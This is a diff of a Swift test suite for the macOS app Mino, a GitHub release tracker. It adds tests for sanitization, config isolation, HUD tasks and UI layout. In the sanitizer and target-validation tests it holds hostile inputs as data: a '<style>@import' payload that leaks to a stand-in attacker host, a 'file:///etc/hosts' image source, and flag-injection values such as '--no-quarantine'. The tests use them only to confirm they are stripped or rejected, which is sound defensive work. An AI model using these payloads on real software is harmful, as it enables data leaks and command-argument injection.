@@ -14,7 +14,12 @@ struct AuditValidationTests {
     }
     
     static func main() async {
-        print("\n🧪 Running Mino Audit Verification Tests (16 High-Value Production Tests)...")
+        print("\n🧪 Running Mino Audit Verification Tests (19 High-Value Production Tests)...")
+        
+        // Ensure test configuration runs in an isolated temporary directory
+        let tempConfigDir = "/tmp/mino_test_config_\(UUID().uuidString)"
+        try? FileManager.default.createDirectory(atPath: tempConfigDir, withIntermediateDirectories: true, attributes: [.posixPermissions: 0o700])
+        setenv("MINO_CONFIG_DIR", tempConfigDir, 1)
         
         // Backup user's actual disk cache & ETags to prevent wiping ~/.config/Mino/cache.json
         // and avoid exhausting GitHub API rate limit quota during subsequent app launches.
@@ -26,12 +31,14 @@ struct AuditValidationTests {
                 GitHubAPI.shared.loadETags(originalETags)
                 print("💾 Restored original user disk cache and ETags cleanly.")
             }
+            try? FileManager.default.removeItem(atPath: tempConfigDir)
         }
         
         testGitHubHostAllowlist()
         testMinoTargetValidation()
         testReleaseNotesLinkSchemes()
         testHTMLStructuralSanitization()
+        testGitSuffixStripping()
         testFileNameSanitization()
         testSafeImageDecompression()
         testConfigManagerAtomicityAndRecovery()
@@ -41,11 +48,16 @@ struct AuditValidationTests {
         testChecksumAndAssetIntegrityPipeline()
         testRateLimitAndHUDProtection()
         await testCommitETagAndRateLimiterPacing()
-        testTargetResolutionAndURLSchemes()
+        await testTargetResolutionAndURLSchemes()
         testPersistentDiskCache()
         testRefreshTimingAndMinuteAnchoring()
+        testPopoverAnchorRecyclingAndScrollSafety()
+        testMinimalistSearchFieldCentering()
+        testAssetDownloadCountFormattingAndParsing()
+        testRowHighlightAndInlineButtonFocusLayout()
+        testMetalSheenEffectAndMinuteTimer()
         
-        print("\n🎉 ALL 16 AUDIT VERIFICATION TESTS PASSED SUCCESSFULLY!\n")
+        print("\n🎉 ALL 22 AUDIT VERIFICATION TESTS PASSED SUCCESSFULLY!\n")
     }
     
     // --------------------------------------------------------
@@ -95,6 +107,11 @@ struct AuditValidationTests {
         assertTest(!Utils.isValidMinoTarget("a/b/c/d"), "Depth > 3 components (a/b/c/d) is REJECTED")
         assertTest(!Utils.isValidMinoTarget("owner//repo"), "Empty components (owner//repo) are REJECTED")
         assertTest(!Utils.isValidMinoTarget("owner/../repo"), "Relative path traversal (owner/../repo) is REJECTED")
+        
+        // Leading dash / flag rejection
+        assertTest(!Utils.isValidMinoTarget("--force"), "Leading dash flag '--force' is REJECTED")
+        assertTest(!Utils.isValidMinoTarget("--no-quarantine"), "Leading dash flag '--no-quarantine' is REJECTED")
+        assertTest(!Utils.isValidMinoTarget("-cask"), "Leading dash component '-cask' is REJECTED")
     }
     
     // --------------------------------------------------------
@@ -167,6 +184,26 @@ struct AuditValidationTests {
         let maliciousFileImg = "<img src=\"file:///etc/hosts\" />"
         let cleanFileImg = Utils.sanitizeHTML(maliciousFileImg)
         assertTest(!cleanFileImg.contains("src=\"file:"), "file: src neutralized")
+        
+        // Preserve legitimate prose with "on..." words and = sign
+        let proseWithOnline = "<p>Server status: online = true, only = active.</p>"
+        let sanitizedProse = Utils.sanitizeHTML(proseWithOnline)
+        assertTest(sanitizedProse.contains("online = true"), "Legitimate prose 'online = true' is preserved without corruption")
+        
+        let stylePayload = "<div>Hello<style>@import url('https://attacker.example/leak');</style></div>"
+        let sanitizedStyle = Utils.sanitizeHTML(stylePayload)
+        assertTest(!sanitizedStyle.contains("@import"), "<style> tag with @import injection is stripped")
+    }
+    
+    // --------------------------------------------------------
+    // Test 4b: Git Suffix Stripping (.git safety)
+    // --------------------------------------------------------
+    static func testGitSuffixStripping() {
+        print("\n[Test 4b] Testing Utils.stripGitSuffix (.git safety)...")
+        assertTest(Utils.stripGitSuffix("owner/.github") == "owner/.github", "Repo 'owner/.github' preserved without turning into 'hub'")
+        assertTest(Utils.stripGitSuffix("user/my.github.io") == "user/my.github.io", "Repo 'user/my.github.io' preserved without turning into 'myhub.io'")
+        assertTest(Utils.stripGitSuffix("owner/repo.git") == "owner/repo", "Trailing .git stripped from 'owner/repo.git'")
+        assertTest(Utils.stripGitSuffix("owner/repo.git/") == "owner/repo", "Trailing .git/ stripped from 'owner/repo.git/'")
     }
     
     // --------------------------------------------------------
@@ -560,17 +597,41 @@ struct AuditValidationTests {
             assertTest(GitHubAPI.shared.currentRateLimit == nil, "Public limit <= 60 rejected from authenticated rate limit window")
         }
         
-        // 4. Verify HUDPanel download completion with separate SHA line and cancellation styling
+        // 4. Verify HUDPanel download completion with separate SHA line and suppressed tooltips
         let destURL = URL(fileURLWithPath: "/tmp/MinoTestAsset.dmg")
         HUDPanel.shared.showDownloadCompletion(title: "MinoTestAsset.dmg", subtitle: "15.40 MB • Descarga completada", sha: "SHA-256: 3a7b1c4e...", destinationURL: destURL)
         assertTest(HUDPanel.shared.cancelButton.isHidden, "Cancel button is hidden on download completion")
         assertTest(HUDPanel.shared.progressBar.isHidden, "Progress bar is hidden on download completion")
         assertTest(!HUDPanel.shared.detailLabel.isHidden && HUDPanel.shared.detailLabel.stringValue == "SHA-256: 3a7b1c4e...", "SHA-256 is displayed on a separate line below completion text")
+        let expRect = HUDPanel.shared.detailLabel.cell?.expansionFrame(withFrame: HUDPanel.shared.detailLabel.bounds, in: HUDPanel.shared.detailLabel)
+        assertTest(expRect == .zero, "HUDPanel detailLabel suppresses expansion tooltips")
         
         HUDPanel.shared.showCancellation(title: "MinoTestAsset.dmg", subtitle: "Descarga cancelada")
         assertTest(HUDPanel.shared.cancelButton.isHidden, "Cancel button is hidden on download cancellation")
         assertTest(HUDPanel.shared.iconView.contentTintColor == .systemOrange, "Cancellation HUD displays orange symbol")
         HUDPanel.shared.hide()
+        
+        // 4b. Verify Dynamic Multi-Task HUD concurrency (Option 1)
+        HUDPanel.shared.showDownloadProgress(id: "taskA", title: "AppSilicon.dmg", status: "Downloading", details: "10 MB", progress: 0.2, onCancel: {})
+        assertTest(!HUDPanel.shared.isMultiTaskMode, "Single task operates in clean single-card mode")
+        let activeScreenRect = (NSScreen.main ?? NSScreen.screens.first)?.visibleFrame ?? NSRect(x: 0, y: 0, width: 1440, height: 900)
+        assertTest(HUDPanel.shared.frame.origin.y > activeScreenRect.midY, "HUDPanel is positioned in upper third of the screen (above vertical center)")
+        
+        HUDPanel.shared.showProgress(id: "taskB", title: "visual-studio-code", subtitle: "Instalando vía Homebrew...", image: nil, progress: 0.0)
+        assertTest(HUDPanel.shared.isMultiTaskMode, "Second task dynamically triggers multi-task stacked mode")
+        assertTest(HUDPanel.shared.tasks.count == 2, "Both concurrent tasks tracked independently in HUDPanel")
+        
+        HUDPanel.shared.updateDownloadProgress(id: "taskA", status: "80%", details: "80 MB / 100 MB", progress: 0.8)
+        assertTest(HUDPanel.shared.tasks["taskA"]?.progress == 0.8, "Task A progress updated independently")
+        assertTest(HUDPanel.shared.tasks["taskB"]?.subtitle == "Instalando vía Homebrew...", "Task B state preserved without being overwritten by Task A")
+        
+        // Complete Task A while Task B is still running
+        HUDPanel.shared.showDownloadCompletion(id: "taskA", title: "AppSilicon.dmg", subtitle: "Descarga completada", destinationURL: destURL)
+        assertTest(HUDPanel.shared.tasks["taskA"]?.isCompleted == true, "Task A marked completed")
+        assertTest(HUDPanel.shared.tasks["taskB"]?.isCompleted == false, "Task B remains active without premature dismissal")
+        
+        HUDPanel.shared.hide()
+        assertTest(HUDPanel.shared.tasks.isEmpty, "HUDPanel.hide cleans up all tasks and reset state")
         
         // 5. RAM Cache Fast Path non-blocking query
         let nonCachedURL = "https://example.com/nonexistent_image_\(UUID().uuidString).png"
@@ -670,7 +731,7 @@ struct AuditValidationTests {
     // --------------------------------------------------------
     // Test 14: Target Resolution & Shortcut Event Handling
     // --------------------------------------------------------
-    static func testTargetResolutionAndURLSchemes() {
+    static func testTargetResolutionAndURLSchemes() async {
         print("\n[Test 14] Testing AppDelegate.findMatchingRepo & CMD+H Shortcut Dispatch...")
         
         // 1. Test handleGlobalShortcuts for CMD+H
@@ -716,10 +777,14 @@ struct AuditValidationTests {
         assertTest(currentMax >= 1.0 && currentMax <= 1.9, "applyMenuScale: 2.5 clamped safely to screen maximum (\(currentMax))")
         
         // Test validateAndClampMenuScaleForCurrentScreen
-        ConfigManager.shared.config.menuScale = 2.0
+        ConfigManager.shared.modifyConfig { cfg in
+            cfg.menuScale = 2.0
+        }
         appDelegate.validateAndClampMenuScaleForCurrentScreen()
-        let validatedScale = ConfigManager.shared.config.menuScale ?? 1.0
-        assertTest(validatedScale <= currentMax, "validateAndClampMenuScaleForCurrentScreen clamped excessive scale to screen max (\(validatedScale))")
+        let preferredScale = ConfigManager.shared.config.menuScale ?? 1.0
+        let effectiveScale = Constants.effectiveScale
+        assertTest(preferredScale == 2.0, "validateAndClampMenuScaleForCurrentScreen PRESERVES user's preferred scale (2.0)")
+        assertTest(effectiveScale <= currentMax, "validateAndClampMenuScaleForCurrentScreen clamped effective screen scale (\(effectiveScale) <= \(currentMax))")
         
         // Test BeerHandle (ASA) tolerance across all 5% scale steps with Float quantization
         for s in [1.00, 1.05, 1.10, 1.15, 1.20, 1.25, 1.30, 1.35, 1.40, 1.45] {
@@ -781,6 +846,16 @@ struct AuditValidationTests {
         // Empty target
         let emptyMatch = AppDelegate.findMatchingRepo(for: "   ", in: testRepos)
         assertTest(emptyMatch == nil, "findMatchingRepo: empty target returns nil safely")
+        
+        // 3. Test ShortcutRecorderButton recording and auto-revert timeout
+        let recorder = ShortcutRecorderButton()
+        recorder.startRecording(timeout: 0.04)
+        assertTest(recorder.isRecording == true, "ShortcutRecorderButton: enters isRecording state on startRecording")
+        assertTest(recorder.attributedTitle.string == Translations.get("shortcutRecording"), "ShortcutRecorderButton: displays shortcutRecording prompt")
+        
+        try? await Task.sleep(nanoseconds: 80_000_000) // 80ms > 40ms
+        assertTest(recorder.isRecording == false, "ShortcutRecorderButton: auto-reverts to non-recording after timeout")
+        assertTest(recorder.attributedTitle.string != Translations.get("shortcutRecording"), "ShortcutRecorderButton: restores normal display title after timeout")
     }
     
     // --------------------------------------------------------
@@ -797,6 +872,13 @@ struct AuditValidationTests {
             sampleRepoName: "\"etag-release-12345\"",
             "\(sampleRepoName):commits": "\"etag-commits-67890\""
         ]
+        
+        // Ensure sample repo is registered so loadCache() retains it
+        ConfigManager.shared.modifyConfig { cfg in
+            if !cfg.repos.contains(where: { $0.name.lowercased() == sampleRepoName.lowercased() }) {
+                cfg.repos.append(RepoConfig(name: sampleRepoName, source: "manual"))
+            }
+        }
         
         // 1. Save cache synchronously
         ConfigManager.shared.saveCacheSync(repoCache: [sampleRepoName: sampleInfo], etags: sampleETags)
@@ -881,5 +963,340 @@ struct AuditValidationTests {
             if s != 0 { allSecondsZero = false }
         }
         assertTest(allSecondsZero, "Chained Scheduling: all 12 hourly intervals land precisely at second 00")
+    }
+    
+    // --------------------------------------------------------
+    // Test 17: Popover Anchor Cell Recycling & Scroll Boundary Safety
+    // --------------------------------------------------------
+    class TestPopover: NSPopover {
+        var mockIsShown = true
+        override var isShown: Bool { mockIsShown }
+        override func close() {
+            mockIsShown = false
+            super.close()
+        }
+    }
+    
+    static func testPopoverAnchorRecyclingAndScrollSafety() {
+        print("\n[Test 17] Testing Popover Anchor Cell Recycling & Scroll Boundary Safety...")
+        
+        let appDelegate = AppDelegate()
+        let notesPopover = TestPopover()
+        let notesVC = ReleaseNotesViewController()
+        _ = notesVC.view
+        notesPopover.contentViewController = notesVC
+        appDelegate.releaseNotesPopover = notesPopover
+        
+        let dummyWindow = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 400, height: 600), styleMask: [.borderless], backing: .buffered, defer: false)
+        dummyWindow.contentView = NSView(frame: NSRect(x: 0, y: 0, width: 400, height: 600))
+        
+        let dataA = RepoDisplayData(
+            repoName: "nadied/Mino",
+            formattedName: "Mino",
+            version: "v2.3.2",
+            ageLabel: "1 day",
+            ageSeconds: 86400,
+            originalDate: "2026-11-19T10:00:00Z",
+            errorMessage: nil,
+            isLoading: false,
+            caskName: nil,
+            freshnessColor: .systemGreen,
+            isNew: false,
+            tags: ["swift"],
+            isFavorite: false
+        )
+        
+        let cellView = RepoMenuItemView(repoName: "nadied/Mino", displayData: dataA, layout: "columns", appDelegate: appDelegate)
+        dummyWindow.contentView?.addSubview(cellView)
+        
+        // Load notes for nadied/Mino and configure popover
+        notesVC.loadNotes(for: RepoInfo(name: "nadied/Mino", error: nil))
+        assertTest(notesPopover.isShown, "Release notes popover is initially shown for nadied/Mino")
+        assertTest(notesVC.currentRepoName == "nadied/Mino", "currentRepoName matches anchor repo")
+        
+        // 1. Reconfigure cell with the SAME repo (scale change or data update) -> Popover must NOT close
+        cellView.reconfigure(with: dataA)
+        assertTest(notesPopover.isShown, "Reconfiguring cell with SAME repo keeps popover open")
+        
+        // 2. Reconfigure cell with DIFFERENT repo (NSTableView cell recycling on scroll) -> Popover must CLOSE
+        let dataB = RepoDisplayData(
+            repoName: "apple/swift",
+            formattedName: "swift",
+            version: "v6.0",
+            ageLabel: "5 days",
+            ageSeconds: 432000,
+            originalDate: "2026-11-15T10:00:00Z",
+            errorMessage: nil,
+            isLoading: false,
+            caskName: nil,
+            freshnessColor: .systemGreen,
+            isNew: false,
+            tags: ["compiler"],
+            isFavorite: false
+        )
+        cellView.reconfigure(with: dataB)
+        assertTest(!notesPopover.isShown, "Reconfiguring cell with DIFFERENT repo immediately closes popover (prevents jumping)")
+        
+        // 3. Scroll boundary intersection calculations
+        let visibleViewport = NSRect(x: 0, y: 100, width: 400, height: 200) // y: 100..300
+        
+        // Row fully in viewport
+        let inViewRow = NSRect(x: 0, y: 150, width: 400, height: 30)
+        let inViewIntersection = visibleViewport.intersection(inViewRow)
+        assertTest(!inViewIntersection.isNull && inViewIntersection.height >= 4, "Row inside viewport has intersection >= 4pt")
+        
+        // Row completely scrolled out of viewport (above)
+        let scrolledOutRow = NSRect(x: 0, y: 50, width: 400, height: 30)
+        let scrolledOutIntersection = visibleViewport.intersection(scrolledOutRow)
+        assertTest(scrolledOutIntersection.isNull || scrolledOutIntersection.height < 4, "Row scrolled out of viewport has null intersection (< 4pt)")
+        
+        // Row barely touching boundary (only 2pt visible at edge) -> considered out of view
+        let edgeRow = NSRect(x: 0, y: 72, width: 400, height: 30) // y: 72..102 -> only 2pt visible in 100..300
+        let edgeIntersection = visibleViewport.intersection(edgeRow)
+        assertTest(!edgeIntersection.isNull && edgeIntersection.height < 4, "Row with < 4pt visible at boundary correctly identified as out-of-view")
+    }
+    
+    // --------------------------------------------------------
+    // Test 18: Minimalist Header Search Field Geometric Centering
+    // --------------------------------------------------------
+    static func testMinimalistSearchFieldCentering() {
+        print("\n[Test 18] Testing Minimalist Header Search Field Geometric Centering...")
+        
+        let appDelegate = AppDelegate()
+        let searchField = MenuSearchField(appDelegate: appDelegate)
+        searchField.frame = NSRect(x: 100, y: 0, width: 200, height: 22)
+        searchField.alignment = .center
+        searchField.isBezeled = false
+        searchField.drawsBackground = false
+        
+        let dummyWindow = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 400, height: 100), styleMask: [.borderless], backing: .buffered, defer: false)
+        dummyWindow.contentView = NSView(frame: NSRect(x: 0, y: 0, width: 400, height: 100))
+        dummyWindow.contentView?.addSubview(searchField)
+        
+        // 1. Check control midpoint in window
+        let sfMidXInWindow = searchField.frame.midX
+        assertTest(abs(sfMidXInWindow - 200.0) < 0.001, "Search field is centered in 400pt window (midX = \(sfMidXInWindow))")
+        
+        // 2. Focus and verify field editor midpoint matches control midpoint
+        dummyWindow.makeKeyAndOrderFront(nil)
+        dummyWindow.makeFirstResponder(searchField)
+        
+        if let editor = searchField.currentEditor() {
+            let editorInSf = searchField.convert(editor.frame, from: editor.superview)
+            let editorMidXDiff = abs(editorInSf.midX - searchField.bounds.midX)
+            assertTest(editorMidXDiff < 0.001, "Focused editor midpoint aligns perfectly with control center (diff: \(editorMidXDiff) < 0.001pt)")
+        }
+        
+        // 3. Test cancelOperation (Esc key clearing)
+        searchField.stringValue = "query"
+        searchField.cancelOperation(nil)
+        assertTest(searchField.stringValue.isEmpty, "cancelOperation (Esc) clears search text cleanly")
+        
+        // 4. Test cancelOperation when empty closes popover
+        class MockPopover: NSPopover {
+            var mockClosed = false
+            var mockIsShown = false
+            override var isShown: Bool { return mockIsShown }
+            override func close() {
+                mockClosed = true
+                mockIsShown = false
+                super.close()
+            }
+        }
+        let popover = MockPopover()
+        popover.mockIsShown = true
+        appDelegate.mainPopover = popover
+        searchField.stringValue = ""
+        searchField.cancelOperation(nil)
+        assertTest(popover.mockClosed, "cancelOperation (Esc) on empty search field closes mainPopover")
+        
+        // 5. Test handleGlobalShortcuts with Esc
+        let escEvent = NSEvent.keyEvent(with: .keyDown, location: .zero, modifierFlags: [], timestamp: 0, windowNumber: 0, context: nil, characters: "\u{1b}", charactersIgnoringModifiers: "\u{1b}", isARepeat: false, keyCode: 53)!
+        popover.mockClosed = false
+        popover.mockIsShown = true
+        let handled = appDelegate.handleGlobalShortcuts(with: escEvent)
+        assertTest(handled && popover.mockClosed, "handleGlobalShortcuts with Esc on empty field closes mainPopover")
+        
+        // 6. Test Esc when Release Notes popover is shown (Notes closes, Menu stays OPEN)
+        let notesPopover = MockPopover()
+        notesPopover.mockIsShown = true
+        appDelegate.releaseNotesPopover = notesPopover
+        popover.mockClosed = false
+        popover.mockIsShown = true
+        
+        let handledNotesEsc = appDelegate.handleGlobalShortcuts(with: escEvent)
+        assertTest(handledNotesEsc, "handleGlobalShortcuts handles Esc when notes popover is open")
+        assertTest(notesPopover.mockClosed, "Esc closes releaseNotesPopover")
+        assertTest(!popover.mockClosed, "Esc leaves mainPopover OPEN when releaseNotesPopover was shown")
+        
+        // 7. Test searchField.cancelOperation when Release Notes popover is shown (Notes closes, Menu stays OPEN)
+        notesPopover.mockClosed = false
+        notesPopover.mockIsShown = true
+        popover.mockClosed = false
+        popover.mockIsShown = true
+        searchField.stringValue = ""
+        searchField.cancelOperation(nil)
+        assertTest(notesPopover.mockClosed, "searchField cancelOperation closes releaseNotesPopover")
+        assertTest(!popover.mockClosed, "searchField cancelOperation leaves mainPopover OPEN when notes was shown")
+    }
+    
+    // --------------------------------------------------------
+    // Test 20: Asset Download Count Formatting & JSON Parsing
+    // --------------------------------------------------------
+    static func testAssetDownloadCountFormattingAndParsing() {
+        print("\n[Test 20] Testing Asset Download Count Formatting & JSON Parsing...")
+        
+        // 1. Download count formatting
+        assertTest(Utils.formatDownloadCount(0) == "0", "Format 0 downloads")
+        assertTest(Utils.formatDownloadCount(42) == "42", "Format 42 downloads")
+        assertTest(Utils.formatDownloadCount(999) == "999", "Format 999 downloads")
+        assertTest(Utils.formatDownloadCount(1420).contains("420"), "Format 1420 downloads contains localized thousands: \(Utils.formatDownloadCount(1420))")
+        assertTest(Utils.formatDownloadCount(10000) == "10k", "Format 10,000 -> 10k")
+        assertTest(Utils.formatDownloadCount(12500) == "12.5k", "Format 12,500 -> 12.5k")
+        assertTest(Utils.formatDownloadCount(1000000) == "1M", "Format 1,000,000 -> 1M")
+        assertTest(Utils.formatDownloadCount(2500000) == "2.5M", "Format 2,500,000 -> 2.5M")
+        
+        // 2. Parse from GitHub JSON payload
+        let sampleJSON: [String: Any] = [
+            "tag_name": "v2.3.2",
+            "body": "Release description",
+            "assets": [
+                [
+                    "name": "Mino_v2.3.2.dmg",
+                    "size": 15000000,
+                    "download_count": 4200,
+                    "browser_download_url": "https://github.com/nad-bit/Mino/releases/download/v2.3.2/Mino_v2.3.2.dmg"
+                ]
+            ]
+        ]
+        
+        let parsed = GitHubAPI.parseReleaseAssets(from: sampleJSON, repo: "nad-bit/Mino", tag: "v2.3.2")
+        let dmgAsset = parsed.first(where: { $0.name == "Mino_v2.3.2.dmg" })
+        assertTest(dmgAsset != nil, "Parsed binary asset from payload")
+        assertTest(dmgAsset?.downloadCount == 4200, "Parsed download_count == 4200 accurately")
+        
+        let sourceZip = parsed.first(where: { $0.isSourceArchive })
+        assertTest(sourceZip?.downloadCount == nil, "Source archives do not possess download count (nil)")
+    }
+    
+    // --------------------------------------------------------------------
+    // Test 21: Row Highlight Compact Block & Inline Button Focus Clearance
+    // --------------------------------------------------------------------
+    static func testRowHighlightAndInlineButtonFocusLayout() {
+        print("\n[Test 21] Testing Row Highlight Block & Inline Button Focus Clearance...")
+        
+        let appDelegate = AppDelegate()
+        let dummyWindow = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 400, height: 600), styleMask: [.borderless], backing: .buffered, defer: false)
+        dummyWindow.contentView = NSView(frame: NSRect(x: 0, y: 0, width: 400, height: 600))
+        
+        let data = RepoDisplayData(
+            repoName: "nad-bit/Mino",
+            formattedName: "Mino",
+            version: "v2.3.2",
+            ageLabel: "1 day",
+            ageSeconds: 86400,
+            originalDate: "2026-11-20T10:00:00Z",
+            errorMessage: nil,
+            isLoading: false,
+            caskName: "mino",
+            freshnessColor: .systemGreen,
+            isNew: true,
+            tags: ["swift"],
+            isFavorite: true
+        )
+        
+        // 1. Verify row highlight has 0 cornerRadius (flush, compact rectangular block across consecutive rows)
+        let cellView = RepoMenuItemView(repoName: "nad-bit/Mino", displayData: data, layout: "columns", appDelegate: appDelegate)
+        assertTest(cellView.layer?.cornerRadius == 0, "RepoMenuItemView has cornerRadius == 0 for compact seamless block")
+        
+        // 2. Verify all layouts have inline buttons fully contained vertically within cell bounds
+        for layout in ["columns", "cards", "tags"] {
+            let cell = RepoMenuItemView(repoName: "nad-bit/Mino", displayData: data, layout: layout, appDelegate: appDelegate)
+            dummyWindow.contentView?.addSubview(cell)
+            cell.setHighlighted(true)
+            cell.setKeyboardFocus(index: 0)
+            
+            let focusedBtn = cell.actionButtons[0]
+            assertTest(focusedBtn.layer?.borderWidth == 2.5, "[\(layout)] Focused button has 2.5pt border thickness")
+            assertTest(focusedBtn.isKeyboardFocused == true, "[\(layout)] Focused button is marked isKeyboardFocused")
+            
+            cell.needsLayout = true
+            cell.layoutSubtreeIfNeeded()
+            
+            for (i, btn) in cell.actionButtons.enumerated() {
+                let insets = btn.alignmentRectInsets
+                assertTest(insets.top == 0 && insets.bottom == 0 && insets.left == 0 && insets.right == 0, "[\(layout)] Button [\(i)] alignmentRectInsets is zero")
+                let frameInCell = cell.convert(btn.bounds, from: btn)
+                let insideY = frameInCell.minY >= 0 && frameInCell.maxY <= cell.bounds.maxY
+                assertTest(insideY, "[\(layout)] Button [\(i)] fits vertically inside cell (y: \(frameInCell.minY)..\(frameInCell.maxY) within 0..\(cell.bounds.maxY))")
+            }
+            
+            cell.removeFromSuperview()
+        }
+    }
+    
+    // --------------------------------------------------------------------
+    // Test 22: Metal-Accelerated Diagonal Sheen Overlay & Minute Timer
+    // --------------------------------------------------------------------
+    static func testMetalSheenEffectAndMinuteTimer() {
+        print("\n[Test 22] Testing Metal Liquid-Crystal Reflection Overlay & Multi-Window Sync...")
+        
+        // 1. Hit-test transparency: Must return nil to never intercept clicks or gestures
+        let sheen = SheenOverlayView(frame: NSRect(x: 0, y: 0, width: 400, height: 500))
+        assertTest(sheen.hitTest(NSPoint(x: 200, y: 250)) == nil, "SheenOverlayView.hitTest returns nil (transparent to all clicks and gestures)")
+        assertTest(sheen.hitTest(NSPoint(x: 0, y: 0)) == nil, "SheenOverlayView.hitTest at origin returns nil")
+        
+        // 2. Trigger animation execution & sweep
+        sheen.triggerSheen(duration: 0.1)
+        assertTest(sheen.layer?.sublayers?.first is CAGradientLayer, "SheenOverlayView contains CAGradientLayer")
+        
+        sheen.sweep(delay: 0.05, duration: 0.2, startX: -80, endX: 480)
+        assertTest(true, "SheenOverlayView.sweep executes cleanly with delay and endpoints")
+        
+        // 3. MainPopoverViewController integration & Minute Timer lifecycle
+        let appDelegate = AppDelegate()
+        let vc = MainPopoverViewController(appDelegate: appDelegate)
+        let _ = vc.view // force loadView
+        
+        vc.startSheenMinuteTimer()
+        // Stop timer immediately to ensure clean teardown
+        vc.stopSheenMinuteTimer()
+        assertTest(true, "MainPopoverViewController startSheenMinuteTimer / stopSheenMinuteTimer executes cleanly")
+        
+        // 4. Trigger sheen on VC (liquid-crystal multi-view reflection)
+        vc.triggerSheen(duration: 0.1)
+        assertTest(true, "MainPopoverViewController.triggerSheen executes cleanly")
+        
+        // 5. Verification that Header, Footer, Handle, Notes, Settings have dedicated sheens and table view is NOT covered
+        let header = HeaderMenuItemView(appDelegate: appDelegate)
+        header.sweepSheen(delay: 0, duration: 0.1, startX: -50, endX: 350)
+        let headerHasSheen = header.subviews.contains { $0 is SheenOverlayView }
+        assertTest(headerHasSheen, "HeaderMenuItemView has dedicated SheenOverlayView")
+        
+        let footer = FooterMenuItemView(appDelegate: appDelegate)
+        footer.sweepSheen(delay: 0, duration: 0.1, startX: -50, endX: 350)
+        let footerHasSheen = footer.subviews.contains { $0 is SheenOverlayView }
+        assertTest(footerHasSheen, "FooterMenuItemView has dedicated SheenOverlayView")
+        
+        let handle = BeerHandlePanel()
+        handle.sweepSheen(delay: 0, duration: 0.1, startX: -50, endX: 100)
+        assertTest(true, "BeerHandlePanel.sweepSheen executes cleanly")
+        
+        let notesVC = ReleaseNotesViewController()
+        let _ = notesVC.view
+        notesVC.sweepSheen(delay: 0, duration: 0.1, startX: -50, endX: 450)
+        let notesHasSheen = notesVC.view.subviews.contains { $0 is SheenOverlayView }
+        assertTest(notesHasSheen, "ReleaseNotesViewController has dedicated SheenOverlayView")
+        
+        let settingsVC = SettingsViewController()
+        let _ = settingsVC.view
+        settingsVC.sweepSheen(delay: 0, duration: 0.1, startX: -50, endX: 450)
+        let settingsHasSheen = settingsVC.view.subviews.contains { $0 is SheenOverlayView }
+        assertTest(settingsHasSheen, "SettingsViewController has dedicated SheenOverlayView")
+        
+        // 6. Ensure repo table view / scroll view is NOT covered by a sheen overlay
+        let containerSubviews = vc.view.subviews
+        let directContainerSheen = containerSubviews.contains { $0 is SheenOverlayView }
+        assertTest(!directContainerSheen, "MainPopoverViewController container does not cover repo list (table view skipped!)")
     }
 }
